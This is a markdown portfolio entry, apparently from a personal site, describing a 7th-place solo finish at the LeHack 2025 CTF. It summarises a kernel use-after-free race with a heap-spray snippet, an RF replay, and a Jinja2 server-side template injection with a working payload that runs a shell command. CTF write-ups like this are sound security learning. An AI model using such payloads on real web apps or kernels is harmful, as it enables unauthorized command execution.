---
id: lehack
label: LeHack
subtitle: CTF Competition
category: security
size: 14
icon: Trophy
connections: ["axians"]
---
# LeHack 2025 — 7th Place

## Overview
LeHack (formerly HZV) is France's largest cybersecurity conference, held annually at the Palais de la Défense, Paris. The 2025 Wargame is a 24-hour Capture The Flag competition run live during the conference.

**Final Standing: 7th out of 400+ teams.**

## Competition Format
- **Type:** Jeopardy-style CTF (mixed categories)
- **Duration:** 24 hours live, on-site
- **Categories:** Web, Pwn, Reverse Engineering, Crypto, OSINT, Hardware
- **Team Size:** Solo entry

## Notable Challenges Solved

### `kernel_leak` — Binary Exploitation (500 pts)
Kernel module with a race condition in the `ioctl` handler. Exploited via concurrent threads triggering a UAF (use-after-free) on a slab cache object, leading to arbitrary kernel read/write.

```c
// Trigger window: race between release() and ioctl IOCTL_READ_DATA
// Thread A: close(fd)  --> triggers kfree(obj)
// Thread B: ioctl(fd, IOCTL_READ_DATA, buf) --> reads freed memory

// Exploit primitive: spray heap with controlled data to reclaim freed slab
for (int i = 0; i < 256; i++) {
    spray_fds[i] = open("/dev/vuln", O_RDWR);
    write(spray_fds[i], payload, sizeof(payload));
}
// After race win: arbitrary read at kernel base + offset(cred)
```

### `blind_eval` — Web (300 pts)
Server-side template injection in a Python Flask app using Jinja2 — filtered environment. Bypassed with MRO traversal to reach `os.popen`.

```python
# SSTI payload reaching OS through class hierarchy
{{ ''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate() }}
```

### `rf_sniff` — Hardware (200 pts)
Intercepted a 433MHz RF remote signal with a HackRF One, replayed via `rpitx` on a Raspberry Pi to trigger the flag service.

## Key Takeaway
> Competing solo against 400+ teams and placing 7th validated the offensive skill set built at Axians and through independent research — particularly in binary exploitation and hardware hacking.
